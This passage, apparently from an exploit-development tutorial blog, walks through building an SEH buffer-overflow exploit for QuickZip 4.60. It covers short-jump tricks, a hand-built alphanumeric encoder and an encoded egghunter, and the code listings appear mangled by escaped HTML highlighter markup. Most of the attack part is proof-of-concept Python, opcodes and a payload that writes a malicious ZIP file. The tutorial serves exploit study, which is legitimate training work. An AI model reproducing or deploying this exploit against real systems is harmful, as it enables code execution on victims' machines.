</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s trigger the crash, pass execution to the program and execute <em>POP-POP-RET</em> instructions. After this, scroll up in the CPU window and try to find end of egghunter payload and long set of <code>INC ECX</code> instructions (representing A characters).</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/16%20found%20egghunter.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/16%20found%20egghunter.png" alt="image" /></a></p>

<p>Great, looks like it&rsquo;s there and it appears to be correct as well - no bad characters were used!</p>

<h2>Jumping back</h2>

<p>Now, we have few more things to look after - the most important thing to remember here is that we need to put address of where the egghunter begins into the EAX and jump to it.</p>

<p>How can we do it having a limited space? Well, first of all - how much space do we have? Quick maths tells us that it&rsquo;s <strong>146</strong> bytes (nseh offset minus the size of egghunter).</p>

<p>What can we do with 146 bytes? We only need to write few instructions, but they need to adhere to the limited character set we&rsquo;re allowed to use. In this case, we cannot use a generic encoder that we already used for egghunter as we simply don&rsquo;t have enough space to fit it in.</p>

<p>This leaves us with one option - we&rsquo;ll need to create our own encoder! It sounds scary and complicated, but it&rsquo;s actually a lot simpler than it seems.</p>

<p>But first, let&rsquo;s see where we are in the program currently.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png" alt="image" /></a></p>

<p>So we only have <strong>4</strong> bytes at our disposal to jump back to the payload and start writing our custom encoder. Also, those 4 bytes would need to be, preferably, alphanumeric. Thankfully, there are few instructions we can use, specifically in situations like those!</p>

<p>Credit given where credit&rsquo;s due - thanks to <a href="https://twitter.com/TheColonial">TheColonial</a> for sharing this very useful trick: <a href="http://buffered.io/posts/jumping-with-bad-chars/">http://buffered.io/posts/jumping-with-bad-chars/</a>.</p>

<p>In short, we can simply use <code>JO</code> and <code>JNO</code> instructions to invoke short jumps back into our payload. But how far can we jump? After some playing around with allowed characters I found that some of the bad characters are converted to <code>A2</code>, which translates to 92 in decimal&hellip; which should give us just enough space to allow us to create our custom encoder.</p>

<p>Let&rsquo;s generate the required OPCODES with <code>metasm</code> and add them in our payload in place of nSEH.</p>

<pre><code>metasm &gt; jno $-99
"\x71\x9b"
metasm &gt; jo $-99
"\x70\x9b"
</code></pre>

<p><em>Note:</em> <code>\x9b</code> (-99), since it&rsquo;s a bad character, will actually be converted into <code>\xa2</code> (-92).</p>

<p>The portion of our PoC should now look like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># nSEH: jno $-99; jo $-99 ==&gt; 9b will actually be converted to A2, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># SEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">pattern</span>                              <span class="c"># pattern to look for in memory</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s trigger the crash, pass execution to the program, step through the <em>POP-POP-RET</em> instructions and observe what happens when we step through the <code>JNO</code>/<code>JO</code> instructions.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/17.jno%20jump%20taken.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/17.jno%20jump%20taken.png" alt="image" /></a></p>

<p>Awesome, the jump is taken and we land in our payload! Let&rsquo;s now create our custom encoder to write instructions to jump to the egg hunting routine.</p>

<h2>Custom encoder</h2>

<p>We need to write several instructions to be able to jump to our egghunter, however, there is no way to write them directly without using bad characters.</p>

<p>To get around it we&rsquo;ll need to do the following:</p>

<ol>
<li>Find out what are the opcodes of instructions we want to write</li>
<li>Using simple, mathematical instructions (namely <code>ADD</code> and <code>SUB</code>) we&rsquo;ll place values of the opcodes from step above into a register of our choice (e.g. <code>EAX</code>) using only allowed characters</li>
<li>We&rsquo;ll write value of this register onto the stack, effectively writing the instructions we want to the area pointed to by <code>ESP</code></li>
</ol>


<p>Sounds complicated? It&rsquo;s actually not that bad and it makes a lot more sense once you start playing with it.</p>

<p>First of all, we need to adjust the stack to be able to write to the area of memory we control. Looking at the values of <code>ESP</code> and where we currently are (screenshot above), we need to offset the <code>ESP</code> by <code>0x62C</code> (<code>0x0018FB58</code> (value of <code>EIP</code>) minus <code>0x0018F528</code> (value of <code>ESP</code>) minus <code>0x4</code> (empty bytes for padding)).</p>

<p>This can be achieved using the following instructions:</p>

<pre><code>push esp;
pop eax;
add eax, 0x62C;
push eax;
pop esp;
</code></pre>

<p>Corresponding OPCODES of above instructions are as follows:</p>

<pre><code>"\x54"                  # push esp;
"\x58"                  # pop eax;
"\x05\x2c\x06\x00\x00"  # add eax, 0x62C
"\x50"                  # push eax;
"\x5c"                  # pop esp;
</code></pre>

<p>However, we have a problem - &ldquo;\x05\x2c\x06\x00\x00&rdquo; has two <code>NULL</code> bytes, which would break our exploit.</p>

<p>However, we can easily fix it up by performing number of <code>ADD</code> and <code>SUB</code> instructions using valid characters to set the value we want, e.g.</p>

<pre><code>\x05\x2d\x07\x01\x01    # add eax, 0x0101072D
\x2d\x01\x01\x01\x01    # sub eax, 0x01010101
                        # total:   0x00000630
</code></pre>

<p>Voilà! We were able to achieve the same thing using valid characters. Let&rsquo;s update the exploit and see what happens.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/18.stack%20adjusted.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/18.stack%20adjusted.png" alt="image" /></a></p>

<p>Great, our payload does exactly what we need leaving us with adjusted stack, ready to start writing our encoder.</p>

<p><em>Note:</em> because of the <code>pop esp</code> instruction (<code>\x5c</code>), contents of our ZIP file look a little bit different. The <code>\x5c</code> represents a backslash, which is interpreted by QuickZip as a folder&hellip; this may have some implications later, but that&rsquo;s OK for now.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/19.quickzip%20folder.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/19.quickzip%20folder.png" alt="image" /></a></p>

<p>Now, the last thing we need to do is to write a set of instructions that put a start address of the egghunter into EAX and jump to it.</p>

<p>In order to avoid bad characters, we&rsquo;ll set the values of opcodes we need in the <code>EAX</code> register and push it on the stack that we have adjusted. This way, the instructions we need will be written in the area we control.</p>

<p>It&rsquo;s probably best explained using an example.</p>

<p>Let&rsquo;s start off with what instructions do we actually want to write? The following will do exactly what we need:
<code>
push esp;
pop eax;
sub eax, 0xDEADBEEF
jmp eax;
</code></p>

<p>Pretty simple - push <code>ESP</code> on the stack, pop it into EAX, adjust it by a certain value to land in the egghunter (we don&rsquo;t know the exact value, hence the placeholder <code>0xDEADBEEF</code> for now) and jump to the adjusted address from <code>EAX</code>.</p>

<p>Let&rsquo;s generate the bytes we need:</p>

<pre><code>metasm &gt; push esp
"\x54"
metasm &gt; pop eax
"\x58"
metasm &gt; sub eax, 0xDEADBEEF
"\x2d\xef\xbe\xad\xde"
metasm &gt; jmp eax
"\xff\xe0"
</code></pre>

<p>And write them in groups of 4:</p>

<pre><code>\x54\x58\x2d\xef
\xbe\xad\xde\xff
\xe0\x90\x90\x90
</code></pre>

<p>Since we&rsquo;ll be writing 4 bytes at a time, we needed to pad it out with 3 nops (<code>\x90</code>) at the end (to put the total length of bytes to write to 12).</p>

<p>Now, let&rsquo;s write the bytes starting from bottom-right (because <a href="https://en.wikipedia.org/wiki/Endianness">endianness</a>) - this will indicate the values that we actually need to push onto the stack.</p>

<pre><code>\x90\x90\x90\xe0
\xff\xde\xad\xbe
\xef\x2d\x58\x54
</code></pre>

<p>Remembering that we can only use ASCII values, that means that we should be able to use pretty much any combination of bytes from <code>01</code> to <code>7f</code> for our calculations.</p>

<p>Let&rsquo;s come up with an exploit friendly instructions to write first set of bytes into eax:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>                        <span class="c"># zero out EAX</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># and eax,0x10101010</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># and eax,0x01010101</span>
</span><span class='line'>                           <span class="c"># write 0x909090e0 into EAX</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># add eax, 0x70707070</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>  <span class="c"># add eax, 0x20202070</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                  <span class="c"># push eax;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s update the exploit code and run it.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/20.writing%20bytes%201.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/20.writing%20bytes%201.png" alt="image" /></a></p>

<p>Fantastic, we have successfully set the value we need in the EAX and pushed it onto the stack, what has actually written the instructions we need!</p>

<p>Let&rsquo;s do the same for all remaining bytes.</p>

<p>After all that maths, the updated PoC should look as follows:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span>
</span><span class='line'><span class="n">jump_offset</span> <span class="o">=</span> <span class="mi">92</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfencode</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">bufferregister</span><span class="o">=</span><span class="n">eax</span> <span class="o">-</span><span class="n">i</span> <span class="n">egghunter</span><span class="o">-</span><span class="n">wow64</span><span class="o">.</span><span class="n">bin</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">146</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x37</span>\<span class="n">x51</span>\<span class="n">x5a</span>\<span class="n">x6a</span>\<span class="n">x41</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x41</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x6b</span>\<span class="n">x41</span>\<span class="n">x41</span>\<span class="n">x51</span>\<span class="n">x32</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x32</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x30</span>\<span class="n">x42</span>\<span class="n">x42</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x38</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x75</span>\<span class="n">x4a</span>\<span class="n">x49</span>\<span class="n">x66</span>\<span class="n">x51</span>\<span class="n">x49</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">x73</span>\<span class="n">x53</span>\<span class="n">x63</span>\<span class="n">x62</span>\<span class="n">x73</span>\<span class="n">x36</span>\<span class="n">x33</span>\<span class="n">x4e</span>\<span class="n">x53</span>\<span class="n">x6f</span>\<span class="n">x30</span>\<span class="n">x75</span>\<span class="n">x36</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6d</span>\<span class="n">x51</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x36</span>\<span class="n">x6f</span>\<span class="n">x72</span>\<span class="n">x62</span>\<span class="n">x71</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x4a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x66</span>\<span class="n">x46</span>\<span class="n">x56</span>\<span class="n">x38</span>\<span class="n">x74</span>\<span class="n">x73</span>\<span class="n">x78</span>\<span class="n">x49</span>\<span class="n">x4c</span>\<span class="n">x4b</span>\<span class="n">x4b</span>\<span class="n">x64</span>\<span class="n">x61</span>\<span class="n">x74</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x47</span>\<span class="n">x63</span>\<span class="n">x31</span>\<span class="n">x4e</span>\<span class="n">x50</span>\<span class="n">x5a</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x77</span>\<span class="n">x75</span>\<span class="n">x53</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x79</span>\<span class="n">x38</span>\<span class="n">x38</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x36</span>\<span class="n">x50</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x33</span>\<span class="n">x44</span>\<span class="n">x6c</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x59</span>\<span class="n">x6a</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x32</span>\<span class="n">x55</span>\<span class="n">x38</span>\<span class="n">x64</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x70</span>\<span class="n">x75</span>\<span class="n">x6b</span>\<span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x4f</span>\<span class="n">x79</span>\<span class="n">x77</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="n">jump_offset</span><span class="p">)</span>   <span class="c"># padding for nSEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offset</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">by</span> <span class="mh">0x62C</span> <span class="n">to</span> <span class="n">start</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">a</span> <span class="n">controlled</span> <span class="n">area</span> <span class="n">of</span> <span class="n">memory</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
